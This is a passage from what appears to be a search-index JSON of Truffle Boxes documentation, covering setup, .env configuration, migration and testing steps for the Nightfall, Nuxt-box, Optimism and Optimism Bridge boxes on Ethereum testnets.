they really won't . Node (tested with 10.15.3) with npm and node-gyp If running macOS, install Xcode then run xcode-select \u2014install to install command line tools. Note: Currently will not work with node v12. To check the node version, run node --version . If using mac/brew, then you may need to run brew install node@10 and brew link --overwrite node@10 --force Python Be sure npm is setup to use v2.7 of python, not python3. To check the python version, run python --version You may need to run npm config set python /usr/bin/python2.7 (or wherever your python 2 location is)", "title": "Supported hardware &amp; prerequisites"}, {"location": "boxes/nightfall/#installation", "text": "First ensure you are in a new and empty directory. Run the unbox command via npx and skip to step 3. This will install all necessary dependencies. npx truffle unbox nightfall Alternatively, you can install Truffle globally and run the unbox command. npm install - g truffle truffle unbox nightfall Start Docker. In the root project directory, we generate the keys and constraint files for our Zero Knowledge Proofs . This is about 7GB and depends on randomness for security. This step can take a while, depending on your hardware (1-3 hours) . Before you begin, check once more you have provisioned enough memory for Docker. npm run setup Alternatively, you can generate specific verification keys and constraint files one at time using a prompt. npm run setup - prompt Now, run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate Execute the script provided for registering Zero Knowledge Proof verification keys on-chain. Note inside the development console we don't preface commands with truffle . exec scripts / registerVks . js Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. // inside the development console. test // outside the development console.. truffle test", "title": "Installation"}, {"location": "boxes/nightfall/#faq", "text": "How do I use this with Ganache-CLI? It's as easy as modifying the config file! Check out our documentation on adding network configurations . Where can I find more documentation? This box is a marriage of Truffle , Nightfall , and ZoKrates . Any of them would be a great place to start!", "title": "FAQ"}, {"location": "boxes/nightfall/#acknowledgements", "text": "This software uses ZoKrates which is licensed under LGPL3 .", "title": "Acknowledgements"}, {"location": "boxes/nuxt-box/", "text": "Nuxt-box \u00b6 Nuxt-box is a truffle box using the Nuxt.js framework to create a Vue.js application that can interact with the smart contracts on Ethereum . Setup & Installation \u00b6 Install truffle : npm i -g truffle Download the box. This also takes care of installing the necessary dependencies: truffle unbox Paperchain/nuxt-box Install Metamask browser extension Running the Application \u00b6 If you have MetaMask set for your browser, configure a Custom RPC with address: http://localhost:9545 from Metamask Networks tab. 1) Open terminal and run the development server: truffle develop 2) Connect local-rpc account with MetaMask. Follow this answer on Ethereum StackExchange. This account will have tokens and ether for transactions. 3) Deploy the contracts to the local-rpc: migrate --reset 4) Copy the token address from the terminal: EIP20: 0x345ca3e014aaf5dca488057592ee47305d9b3e10 5) Paste the token address to src/store/eip20.js where it says: const tokenAddress = '0x345ca3e014aaf5dca488057592ee47305d9b3e10' // insert deployed EIP20 token address here 6) Open a new terminal tab and run the webapp: npm run dev Web App Commands \u00b6 # install dependencies $ npm install # Or yarn install # serve with hot reload at localhost:3000 $ npm run dev # build for production and launch server $ npm run build $ npm start # generate static project using $ npm run generate # lint or lintfix $ npm run lint $ npm run lintfix Truffle Commands \u00b6 # run contract tests $ truffle test # run truffle development mode (run local blockchain) $ truffle develop # deploy contracts to local blockchain $ truffle migrate --reset $ migrate --reset ( when in development mode ) Credits \u00b6 For example purposes this boilerplate uses EIP20 token contracts made by ConsenSys .", "title": "Index"}, {"location": "boxes/nuxt-box/#nuxt-box", "text": "Nuxt-box is a truffle box using the Nuxt.js framework to create a Vue.js application that can interact with the smart contracts on Ethereum .", "title": "Nuxt-box"}, {"location": "boxes/nuxt-box/#setup-installation", "text": "Install truffle : npm i -g truffle Download the box. This also takes care of installing the necessary dependencies: truffle unbox Paperchain/nuxt-box Install Metamask browser extension", "title": "Setup &amp; Installation"}, {"location": "boxes/nuxt-box/#running-the-application", "text": "If you have MetaMask set for your browser, configure a Custom RPC with address: http://localhost:9545 from Metamask Networks tab. 1) Open terminal and run the development server: truffle develop 2) Connect local-rpc account with MetaMask. Follow this answer on Ethereum StackExchange. This account will have tokens and ether for transactions. 3) Deploy the contracts to the local-rpc: migrate --reset 4) Copy the token address from the terminal: EIP20: 0x345ca3e014aaf5dca488057592ee47305d9b3e10 5) Paste the token address to src/store/eip20.js where it says: const tokenAddress = '0x345ca3e014aaf5dca488057592ee47305d9b3e10' // insert deployed EIP20 token address here 6) Open a new terminal tab and run the webapp: npm run dev", "title": "Running the Application"}, {"location": "boxes/nuxt-box/#web-app-commands", "text": "# install dependencies $ npm install # Or yarn install # serve with hot reload at localhost:3000 $ npm run dev # build for production and launch server $ npm run build $ npm start # generate static project using $ npm run generate # lint or lintfix $ npm run lint $ npm run lintfix", "title": "Web App Commands"}, {"location": "boxes/nuxt-box/#truffle-commands", "text": "# run contract tests $ truffle test # run truffle development mode (run local blockchain) $ truffle develop # deploy contracts to local blockchain $ truffle migrate --reset $ migrate --reset ( when in development mode )", "title": "Truffle Commands"}, {"location": "boxes/nuxt-box/#credits", "text": "For example purposes this boilerplate uses EIP20 token contracts made by ConsenSys .", "title": "Credits"}, {"location": "boxes/optimism/", "text": "Optimism Box \u00b6 Requirements Installation Setup Using the .env File New Configuration File New Directory Structure for Artifacts Optimistic Ethereum Compiling Migrating Basic Commands Testing Communication Between Ethereum and Optimism Chains Support Table of contents generated with markdown-toc This Truffle Optimism Box provides you with the boilerplate structure necessary to start coding for Optimism's Ethereum Layer 2 solution. For detailed information on how Optimism works, please see the documentation here . As a starting point, this box contains only the SimpleStorage Solidity contract. Including minimal code was a conscious decision as this box is meant to provide the initial building blocks needed to get to work on Optimism without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Optimistic Solidity code against a variety of Optimism test networks. Check out how to build a NFT marketplace on Optimism here . Optimism's Layer 2 solution is almost fully compatible with the EVM, though it uses an \"optimistic\" EVM called the OVM. The main difference between the EVM and the OVM that developers will notice is that some opcodes are not available for contracts that are deployed to the OVM. You can see the complete list of differences between Optimism's fork of the solc compiler and the original here . Requirements \u00b6 The Optimism Box has the following requirements: Node.js 10.x or later NPM version 5.2 or later docker , version 19.03.12 or later docker-compose , version 1.27.3 or later Recommended Docker memory allocation of >=8 GB. Windows, Linux or MacOS Helpful, but optional: - An Infura account and Project ID - A MetaMask account Installation \u00b6 Note that this installation command will only work once the box is published (in the interim you can use truffle unbox https://github.com/truffle-box/optimism-box ). $ truffle unbox optimism Setup \u00b6 Using the env File \u00b6 You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.ovm.js file expects a GANACHE_MNEMONIC and a GOERLI_MNEMONIC value to exist in .env for running commands on each of these networks, as well as a default MNEMONIC for the optimistic network we will run locally. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: 1) Use touch .env in the command line to create a .env file at the root of your project. 2) Open the .env file in your preferred IDE 3) Add the following, filling in your own Infura project key and mnemonics: MNEMONIC=\"candy maple cake sugar pudding cream honey rich smooth crumble sweet treat\" INFURA_KEY=\"<Your Infura Project ID>\" GANACHE_MNEMONIC=\"<Your Ganache Mnemonic>\" GOERLI_MNEMONIC=\"<Your Goerli Mnemonic>\" Note: the value for the MNEMONIC above is the one you should use, as it is expected within the local optimistic ethereum network we will run in this Truffle Box. 4) As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] . New Configuration File \u00b6 A new configuration file exists in this project: truffle-config.ovm.js . This file contains a reference to the new file location of the contracts_build_directory and contracts_directory for Optimism contracts and lists several networks for running the Optimism Layer 2 network instance (see below ). Please note, the classic truffle-config.js configuration file is included here as well, because you will eventually want to deploy contracts to Ethereum as well. All normal truffle commands ( truffle compile , truffle migrate , etc.) will use this config file and save built files to build/ethereum-contracts . You can save Solidity contracts that you wish to deploy to Ethereum in the contracts/ethereum folder. New Directory Structure for Artifacts \u00b6 When you compile or migrate, the resulting json files will be at build/optimism-contracts/ . This is to distinguish them from any Ethereum contracts you build, which will live in build/ethereum-contracts . As we have included the appropriate contracts_build_directory in each configuration file, Truffle will know which set of built files to reference! Optimistic Ethereum \u00b6 Compiling \u00b6 To compile your code for Optimistic Ethereum, run the following in your terminal: npm run compile:ovm This script lets Truffle know to use the truffle-config.ovm.js configuration file, which references the directory in which we'll save your compiled contracts. When adding new contracts to compile, you may find some discrepancies and errors, so please remember to keep an eye on differences between solc and optimistic solc ! If you would like to recompile previously compiled contracts, you can manually run this command with truffle compile --config truffle-config.ovm.js and add the --all flag. Migrating \u00b6 To migrate on an Optimistic Layer 2, run: npm run migrate:ovm --network=(ganache | optimistic_ethereum | optimistic_goerli | dashboard) (remember to choose a network from these options!). You have several Optimistic Layer 2 networks to choose from, prepackaged in this box (note: Layer 1 networks associated with Optimism are included in the regular truffle-config.js file, to aid you with further development. But here we'll just go through the Layer 2 deployment options available): optimistic_ethereum : This network is the default Layer 1/Layer 2 integration provided by Optimism for testing your Optimistic Ethereum code. Documentation about this setup can be found here . You will need to install the code for this network in this box in order to use the scripts associated with it. To install it, run npm run installLocalOptimism . You should only need to run this initiation command once. It will create an optimism directory in this project that will house the repository you need. If at any point you want to update to the latest optimism docker image, you can delete your optimism directory and run this command again. If you wish to use this network, be sure to run npm run startLocalOptimism so that the optimism test ecosystem docker image can be served. For our purposes, you should be able to compile, migrate, and test against this network once the docker image is fully running. See documentation and updates about this docker container for additional information. Please note, after running npm run startLocalOptimism it can take several minutes for the test ecosystem to be up and running on your local machine. The first time you run this command, it will take a bit longer for everything to be set up. Future runs will be quicker! To stop the local docker container, use npm run stopLocalOptimism in a new terminal tab to ensure graceful shutdown. ganache : This network uses an optimistic ganache instance for migrations. The usage is essentially identical to use of regular ganache. Note: This optimistic ganache instance is no longer actively maintained. We recommend using optimistic_ethereum for local testing. Stay tuned for additional ganache resources in the future! optimistic_goerli : Optimism has deployed a testnet to the Goerli network. The RPC endpoint is https://optimism-goerli.infura.io/v3/. In order to access this node for testing, you will need to connect a wallet (we suggest MetaMask ). Save your seed phrase in a .env file as GOERLI_MNEMONIC . Using an .env file for the mnemonic is safer practice because it is listed in .gitignore and thus will not be committed. You will need Goerli ETH in an Optimistic Goerli wallet to deploy contracts using this network. In order to deploy to Optimistic Goerli, you will need to acquire Optimistic Goerli ETH. As of this writing, there is not an Optimistic Goerli ETH faucet. In order to get Optimistic Goerli ETH, follow these steps: 1) Acquire ETH for your Goerli wallet on MetaMask using a Goerli faucet . 2) Optimism's gateway still doesn't support Goerli, but if you transfer Goerli ETH to 0x636Af16bf2f682dD3109e60102b8E1A089FedAa8 (opens new window), you will get it on Optimistic Goerli. Note: You may get an error about the block limit being exceeded. The Truffle team is working on this issue, but in the meantime you can add this line before the deployment in your migrations/1_deploy_contracts.js file: SimpleStorage.gasMultiplier = 0.9; Layer 1 networks are included in the truffle-config.js file, but it is not necessary to deploy your base contracts to Layer 1 right now. Eventually, you will likely have a Layer 2 contract that you want to connect with a Layer 1 contract (they do not have to be identical!). One example is an ERC20 contract that is deployed on an Optimistic Ethereum network. At some point the user will wish to withdraw their funds into Ethereum. There will need to be a contract deployed on Layer 1 that can receive the message from Layer 2 to mint the appropriate tokens on Layer 1 for the user. More information on this system can be found here . If you would like to migrate previously migrated contracts on the same network, you can run truffle migrate --config truffle-config.ovm.js --network=(ganache | optimistic_ethereum | optimistic_goerli | dashboard) and add the --reset flag. Basic Commands \u00b6 The code here will allow you to compile, migrate, and test your code against an Optimistic Ethereum instance. The following commands can be run (more details on each can be found in the next section): To compile: npm run compile:ovm To migrate: npm run migrate:ovm --network=(ganache | optimistic_ethereum | optimistic_goerli | dashboard) To test: npm run test:ovm --network=(ganache | optimistic_ethereum | optimistic_goerli | dashboard) To run a script: npm run exec:ovm script --network=(ganache | optimistic_ethereum | optimistic_goerli | dashboard) Using truffle exec gives your script access to the instance of web3 you have running, via web3 , and also includes your contracts as global objects when executing the script. For more information on this command, see here . Testing \u00b6 Currently, this box supports testing via Javascript/TypeScript tests. In order to run the test currently in the boilerplate, use the following command: npm run test:ovm --network=(ganache | optimistic_ethereum | optimistic_goerli | dashboard) Remember that there are some differences between the EVM and the OVM, and refer to the Optimism documentation if you run into test failures. Running Scripts \u00b6 You can write scripts that have access to your Truffle configuration and a web3 instance that is connected to the network indicated using truffle exec using the following command: npm run exec:ovm script --network=(ganache | optimistic_ethereum | optimistic_goerli | dashboard) Remember that there are some differences between the EVM and the OVM, and refer to the Optimism documentation if you run into failures. Communication Between Ethereum and Optimism Chains \u00b6 The information above should allow you to deploy to the Optimism Layer 2 chain. This is only the first step! Once you are ready to deploy your own contracts to function on Layer 1 using Layer 2, you will need to be aware of the ways in which Layer 1 and Layer 2 interact in the Optimism ecosystem . We have an Optimism Bridge Box that shows you just how to do that! Support \u00b6 Support for this box is available via the Truffle community available here .", "title": "Optimism Box"}, {"location": "boxes/optimism/#optimism-box", "text": "Requirements Installation Setup Using the .env File New Configuration File New Directory Structure for Artifacts Optimistic Ethereum Compiling Migrating Basic Commands Testing Communication Between Ethereum and Optimism Chains Support Table of contents generated with markdown-toc This Truffle Optimism Box provides you with the boilerplate structure necessary to start coding for Optimism's Ethereum Layer 2 solution. For detailed information on how Optimism works, please see the documentation here . As a starting point, this box contains only the SimpleStorage Solidity contract. Including minimal code was a conscious decision as this box is meant to provide the initial building blocks needed to get to work on Optimism without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Optimistic Solidity code against a variety of Optimism test networks. Check out how to build a NFT marketplace on Optimism here . Optimism's Layer 2 solution is almost fully compatible with the EVM, though it uses an \"optimistic\" EVM called the OVM. The main difference between the EVM and the OVM that developers will notice is that some opcodes are not available for contracts that are deployed to the OVM. You can see the complete list of differences between Optimism's fork of the solc compiler and the original here .", "title": "Optimism Box"}, {"location": "boxes/optimism/#requirements", "text": "The Optimism Box has the following requirements: Node.js 10.x or later NPM version 5.2 or later docker , version 19.03.12 or later docker-compose , version 1.27.3 or later Recommended Docker memory allocation of >=8 GB. Windows, Linux or MacOS Helpful, but optional: - An Infura account and Project ID - A MetaMask account", "title": "Requirements"}, {"location": "boxes/optimism/#installation", "text": "Note that this installation command will only work once the box is published (in the interim you can use truffle unbox https://github.com/truffle-box/optimism-box ). $ truffle unbox optimism", "title": "Installation"}, {"location": "boxes/optimism/#setup", "text": "", "title": "Setup"}, {"location": "boxes/optimism/#using-the-env-file", "text": "You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.ovm.js file expects a GANACHE_MNEMONIC and a GOERLI_MNEMONIC value to exist in .env for running commands on each of these networks, as well as a default MNEMONIC for the optimistic network we will run locally. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: 1) Use touch .env in the command line to create a .env file at the root of your project. 2) Open the .env file in your preferred IDE 3) Add the following, filling in your own Infura project key and mnemonics: MNEMONIC=\"candy maple cake sugar pudding cream honey rich smooth crumble sweet treat\" INFURA_KEY=\"<Your Infura Project ID>\" GANACHE_MNEMONIC=\"<Your Ganache Mnemonic>\" GOERLI_MNEMONIC=\"<Your Goerli Mnemonic>\" Note: the value for the MNEMONIC above is the one you should use, as it is expected within the local optimistic ethereum network we will run in this Truffle Box. 4) As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] .", "title": "Using the env File"}, {"location": "boxes/optimism/#new-configuration-file", "text": "A new configuration file exists in this project: truffle-config.ovm.js . This file contains a reference to the new file location of the contracts_build_directory and contracts_directory for Optimism contracts and lists several networks for running the Optimism Layer 2 network instance (see below ). Please note, the classic truffle-config.js configuration file is included here as well, because you will eventually want to deploy contracts to Ethereum as well. All normal truffle commands ( truffle compile , truffle migrate , etc.) will use this config file and save built files to build/ethereum-contracts . You can save Solidity contracts that you wish to deploy to Ethereum in the contracts/ethereum folder.", "title": "New Configuration File"}, {"location": "boxes/optimism/#new-directory-structure-for-artifacts", "text": "When you compile or migrate, the resulting json files will be at build/optimism-contracts/ . This is to distinguish them from any Ethereum contracts you build, which will live in build/ethereum-contracts . As we have included the appropriate contracts_build_directory in each configuration file, Truffle will know which set of built files to reference!", "title": "New Directory Structure for Artifacts"}, {"location": "boxes/optimism/#optimistic-ethereum", "text": "", "title": "Optimistic Ethereum"}, {"location": "boxes/optimism/#compiling", "text": "To compile your code for Optimistic Ethereum, run the following in your terminal: npm run compile:ovm This script lets Truffle know to use the truffle-config.ovm.js configuration file, which references the directory in which we'll save your compiled contracts. When adding new contracts to compile, you may find some discrepancies and errors, so please remember to keep an eye on differences between solc and optimistic solc ! If you would like to recompile previously compiled contracts, you can manually run this command with truffle compile --config truffle-config.ovm.js and add the --all flag.", "title": "Compiling"}, {"location": "boxes/optimism/#migrating", "text": "To migrate on an Optimistic Layer 2, run: npm run migrate:ovm --network=(ganache | optimistic_ethereum | optimistic_goerli | dashboard) (remember to choose a network from these options!). You have several Optimistic Layer 2 networks to choose from, prepackaged in this box (note: Layer 1 networks associated with Optimism are included in the regular truffle-config.js file, to aid you with further development. But here we'll just go through the Layer 2 deployment options available): optimistic_ethereum : This network is the default Layer 1/Layer 2 integration provided by Optimism for testing your Optimistic Ethereum code. Documentation about this setup can be found here . You will need to install the code for this network in this box in order to use the scripts associated with it. To install it, run npm run installLocalOptimism . You should only need to run this initiation command once. It will create an optimism directory in this project that will house the repository you need. If at any point you want to update to the latest optimism docker image, you can delete your optimism directory and run this command again. If you wish to use this network, be sure to run npm run startLocalOptimism so that the optimism test ecosystem docker image can be served. For our purposes, you should be able to compile, migrate, and test against this network once the docker image is fully running. See documentation and updates about this docker container for additional information. Please note, after running npm run startLocalOptimism it can take several minutes for the test ecosystem to be up and running on your local machine. The first time you run this command, it will take a bit longer for everything to be set up. Future runs will be quicker! To stop the local docker container, use npm run stopLocalOptimism in a new terminal tab to ensure graceful shutdown. ganache : This network uses an optimistic ganache instance for migrations. The usage is essentially identical to use of regular ganache. Note: This optimistic ganache instance is no longer actively maintained. We recommend using optimistic_ethereum for local testing. Stay tuned for additional ganache resources in the future! optimistic_goerli : Optimism has deployed a testnet to the Goerli network. The RPC endpoint is https://optimism-goerli.infura.io/v3/. In order to access this node for testing, you will need to connect a wallet (we suggest MetaMask ). Save your seed phrase in a .env file as GOERLI_MNEMONIC . Using an .env file for the mnemonic is safer practice because it is listed in .gitignore and thus will not be committed. You will need Goerli ETH in an Optimistic Goerli wallet to deploy contracts using this network. In order to deploy to Optimistic Goerli, you will need to acquire Optimistic Goerli ETH. As of this writing, there is not an Optimistic Goerli ETH faucet. In order to get Optimistic Goerli ETH, follow these steps: 1) Acquire ETH for your Goerli wallet on MetaMask using a Goerli faucet . 2) Optimism's gateway still doesn't support Goerli, but if you transfer Goerli ETH to 0x636Af16bf2f682dD3109e60102b8E1A089FedAa8 (opens new window), you will get it on Optimistic Goerli. Note: You may get an error about the block limit being exceeded. The Truffle team is working on this issue, but in the meantime you can add this line before the deployment in your migrations/1_deploy_contracts.js file: SimpleStorage.gasMultiplier = 0.9; Layer 1 networks are included in the truffle-config.js file, but it is not necessary to deploy your base contracts to Layer 1 right now. Eventually, you will likely have a Layer 2 contract that you want to connect with a Layer 1 contract (they do not have to be identical!). One example is an ERC20 contract that is deployed on an Optimistic Ethereum network. At some point the user will wish to withdraw their funds into Ethereum. There will need to be a contract deployed on Layer 1 that can receive the message from Layer 2 to mint the appropriate tokens on Layer 1 for the user. More information on this system can be found here . If you would like to migrate previously migrated contracts on the same network, you can run truffle migrate --config truffle-config.ovm.js --network=(ganache | optimistic_ethereum | optimistic_goerli | dashboard) and add the --reset flag.", "title": "Migrating"}, {"location": "boxes/optimism/#basic-commands", "text": "The code here will allow you to compile, migrate, and test your code against an Optimistic Ethereum instance. The following commands can be run (more details on each can be found in the next section): To compile: npm run compile:ovm To migrate: npm run migrate:ovm --network=(ganache | optimistic_ethereum | optimistic_goerli | dashboard) To test: npm run test:ovm --network=(ganache | optimistic_ethereum | optimistic_goerli | dashboard) To run a script: npm run exec:ovm script --network=(ganache | optimistic_ethereum | optimistic_goerli | dashboard) Using truffle exec gives your script access to the instance of web3 you have running, via web3 , and also includes your contracts as global objects when executing the script. For more information on this command, see here .", "title": "Basic Commands"}, {"location": "boxes/optimism/#testing", "text": "Currently, this box supports testing via Javascript/TypeScript tests. In order to run the test currently in the boilerplate, use the following command: npm run test:ovm --network=(ganache | optimistic_ethereum | optimistic_goerli | dashboard) Remember that there are some differences between the EVM and the OVM, and refer to the Optimism documentation if you run into test failures.", "title": "Testing"}, {"location": "boxes/optimism/#running-scripts", "text": "You can write scripts that have access to your Truffle configuration and a web3 instance that is connected to the network indicated using truffle exec using the following command: npm run exec:ovm script --network=(ganache | optimistic_ethereum | optimistic_goerli | dashboard) Remember that there are some differences between the EVM and the OVM, and refer to the Optimism documentation if you run into failures.", "title": "Running Scripts"}, {"location": "boxes/optimism/#communication-between-ethereum-and-optimism-chains", "text": "The information above should allow you to deploy to the Optimism Layer 2 chain. This is only the first step! Once you are ready to deploy your own contracts to function on Layer 1 using Layer 2, you will need to be aware of the ways in which Layer 1 and Layer 2 interact in the Optimism ecosystem . We have an Optimism Bridge Box that shows you just how to do that!", "title": "Communication Between Ethereum and Optimism Chains"}, {"location": "boxes/optimism/#support", "text": "Support for this box is available via the Truffle community available here .", "title": "Support"}, {"location": "boxes/optimism-bridge/", "text": "Optimism Bridge Box \u00b6 Truffle Optimism Bridge Box provides you with setup necessary to start building applications between multiple Ethereum network layers. This box contains contracts that interact with the Optimism bridge on L1 and L2, along with a set of migrations for deploying, calling functions, and passing messages and value between both layers. Requirements Installation Setup Installing dependencies Using the .env File Bridging Messaging Demo Known Issues Developing for Optimism Support Table of contents generated with markdown-toc Requirements \u00b6 We recommend following these instructions here . The Optimism Box has the following requirements: Node.js v12 - 16 or later NPM version 5.2 or later Windows, Linux or MacOS An Infura account and Project ID A MetaMask account Installation \u00b6 $ truffle unbox optimism-bridge <DIRECTORY_NAME> Setup \u00b6 Installing dependencies \u00b6 truffle unbox should run npm install as part of the unboxing process. Using the env File \u00b6 You will need the goerli mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project to help protect your private data. It is good security practice to avoid committing information about your private keys to github. The truffle-config.ovm.js file expects a GOERLI_MNEMONIC value to exist in .env for running commands on the Goerli and Optimism Goerli testnets and an INFURA_KEY to connect to the network. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: Run cp .env.example .env in the command line to copy some important variables into a private .env file. Open the .env file in your preferred IDE Fill in your mnemonic for the networks you intend to use, as well as your Infura key . As you develop your project, you can put any other sensitive information in the .env file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] . Bridging \u00b6 This box includes: An L1 contract that sends a message over the Optimism bridge. A Migration that sends a message from Ethereum to Optimism. An L2 contract that sends a message over the Optimism bridge. A Migration that sends a message from Optimism to Ethereum. A script to automate the process of compiling contracts, running migrations, and sending messages across each side of the bridge. A script to automate the process of sending ETH and DAI across each side of the bridge. Once you have installed dependencies and set up your .env file, you're ready to start bridging! Messaging Demo \u00b6 Included is a helper script that facilitates the full compilation, migration, and bridging of messages between Goerli and Optimism Goerli. To use it, you will need testnet ETH on those networks. Use a faucet to receive some. Additionally, you will need to add the Optimism addon to your Infura account. Once youre ready, run: npm run deploy This script automates the following steps: Migration 1 + 2 \u00b6 The first two migrations are simple contract deploys to each network. These are necessary for the following migrations. Migration 3 \u00b6 Upon completion of the migration, you will be prompted with a link to confirm the bridged message via Etherscan: Expected output: Updating the L2 Greetings contract from L1! \ud83d\udc4b\ud83d\udc4b \ud83d\ude4c Greeter txn confirmed on L1! 0xabc... \ud83d\udee3\ufe0f Bridging message to L2 Greeter contract... \ud83d\udd50 In about 1 minute, check the Greeter contract \"read\" function : https://goerli-optimistic.etherscan.io/address/0xD4c204223d6F1Dfad0b7a0b05BB0bCaB6665e0c9#readContract Click the link and open the greet function to see your greeting! Migration 4 \u00b6 Upon completion of the migration, you will be prompted with a link to confirm the bridged message via Etherscan: Expected output: Updating the L1 Greetings contract from L2! \ud83d\udc4b \ud83d\ude4c\ud83d\ude4c Greeter txn confirmed on L2! 0x93d390d84e99a0e229ef813afe4b42d2cfed8ac1f8f0711e721cce4eab30046c \ud83d\udee3\ufe0f Bridging message to L1 Greeter contract. \ud83d\udd50 This will take at least 1 -5 min... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... \ud83d\udcec Message received! Finalizing... \ud83c\udf89 Message finalized. Check the L1 Greeter contract \"read\" function : https://goerli.etherscan.io/address/0x11fB328D5Bd8E27917535b6d40b881d35BC39Be0#readContract Click the link and open the greet function to see your greeting! Known Issues \u00b6 There is known issue that occurs under certain network conditions resulting in the failure of migration 4 with the following error: Error: Could not find block @trufflesuite/web3-provider-engine/index.js:163 This is due to an issue with a dependency and we are working on a fix. In the meantime, if you encounter this, it is safe to simply rerun that migration with truffle migrate --network=optimistic_goerli --config=truffle-config.ovm --f 4 --to 4 --skip-dry-run . Briding Eth Demo \u00b6 The script goerli_bridge_value.mjs demonstrates how to send ETH and DAI across each side of the bridge. To run it, you will also need DAI on the Goerli network. You can go to Uniswap to exchange ETH for DAI on Goerli. Then call: node ./scripts/goerli_bridge_value.js Developing for Optimism \u00b6 To learn more about developing for Optimism, see the Truffle Optimism Box Support \u00b6 Support for this box is available via the Truffle community available here .", "title": "Optimism Bridge Box"}, {"location": "boxes/optimism-bridge/#optimism-bridge-box", "text": "Truffle Optimism Bridge Box provides you with setup necessary to start building applications between multiple Ethereum network layers. This box contains contracts that interact with the Optimism bridge on L1 and L2, along with a set of migrations for deploying, calling functions, and passing messages and value between both layers. Requirements Installation Setup Installing dependencies Using the .env File Bridging Messaging Demo Known Issues Developing for Optimism Support Table of contents generated with markdown-toc", "title": "Optimism Bridge Box"}, {"location": "boxes/optimism-bridge/#requirements", "text": "We recommend following these instructions here . The Optimism Box has the following requirements: Node.js v12 - 16 or later NPM version 5.2 or later Windows, Linux or MacOS An Infura account and Project ID A MetaMask account", "title": "Requirements"}, {"location": "boxes/optimism-bridge/#installation", "text": "$ truffle unbox optimism-bridge <DIRECTORY_NAME>", "title": "Installation"}, {"location": "boxes/optimism-bridge/#setup", "text": "", "title": "Setup"}, {"location": "boxes/optimism-bridge/#installing-dependencies", "text": "truffle unbox should run npm install as part of the unboxing process.", "title": "Installing dependencies"}, {"location": "boxes/optimism-bridge/#using-the-env-file", "text": "You will need the goerli mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project to help protect your private data. It is good security practice to avoid committing information about your private keys to github. The truffle-config.ovm.js file expects a GOERLI_MNEMONIC value to exist in .env for running commands on the Goerli and Optimism Goerli testnets and an INFURA_KEY to connect to the network. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: Run cp .env.example .env in the command line to copy some important variables into a private .env file. Open the .env file in your preferred IDE Fill in your mnemonic for the networks you intend to use, as well as your Infura key . As you develop your project, you can put any other sensitive information in the .env file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] .", "title": "Using the env File"}, {"location": "boxes/optimism-bridge/#bridging", "text": "This box includes: An L1 contract that sends a message over the Optimism bridge. A Migration that sends a message from Ethereum to Optimism. An L2 contract that sends a message over the Optimism bridge. A Migration that sends a message from Optimism to Ethereum. A script to automate the process of compiling contracts, running migrations, and sending messages across each side of the bridge. A script to automate the process of sending ETH and DAI across each side of the bridge. Once you have installed dependencies and set up your .env file, you're ready to start bridging!", "title": "Bridging"}, {"location": "boxes/optimism-bridge/#messaging-demo", "text": "Included is a helper script that facilitates the full compilation, migration, and bridging of messages between Goerli and Optimism Goerli. To use it, you will need testnet ETH on those networks. Use a faucet to receive some. Additionally, you will need to add the Optimism addon to your Infura account. Once youre ready, run: npm run deploy This script automates the following steps:", "title": "Messaging Demo"}, {"location": "boxes/optimism-bridge/#migration-1-2", "text": "The first two migrations are simple contract deploys to each network. These are necessary for the following migrations.", "title": "Migration 1 + 2"}, {"location": "boxes/optimism-bridge/#migration-3", "text": "Upon completion of the migration, you will be prompted with a link to confirm the bridged message via Etherscan: Expected output: Updating the L2 Greetings contract from L1! \ud83d\udc4b\ud83d\udc4b \ud83d\ude4c Greeter txn confirmed on L1! 0xabc... \ud83d\udee3\ufe0f Bridging message to L2 Greeter contract... \ud83d\udd50 In about 1 minute, check the Greeter contract \"read\" function : https://goerli-optimistic.etherscan.io/address/0xD4c204223d6F1Dfad0b7a0b05BB0bCaB6665e0c9#readContract Click the link and open the greet function to see your greeting!", "title": "Migration 3"}, {"location": "boxes/optimism-bridge/#migration-4", "text": "Upon completion of the migration, you will be prompted with a link to confirm the bridged message via Etherscan: Expected output: Updating the L1 Greetings contract from L2! \ud83d\udc4b \ud83d\ude4c\ud83d\ude4c Greeter txn confirmed on L2! 0x93d390d84e99a0e229ef813afe4b42d2cfed8ac1f8f0711e721cce4eab30046c \ud83d\udee3\ufe0f Bridging message to L1 Greeter contract. \ud83d\udd50 This will take at least 1 -5 min... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... \ud83d\udcec Message received! Finalizing... \ud83c\udf89 Message finalized. Check the L1 Greeter contract \"read\" function : https://goerli.etherscan.io/address/0x11fB328D5Bd8E27917535b6d40b881d35BC39Be0#readContract Click the link and open the greet function to see your greeting!", "title": "Migration 4"}, {"location": "boxes/optimism-bridge/#known-issues", "text": "There is known issue that occurs under certain network conditions resulting in the failure of migration 4 with the following error: Error: Could not find block @trufflesuite/web3-provider-engine/index.js:163 This is due to an issue with a dependency and we are working on 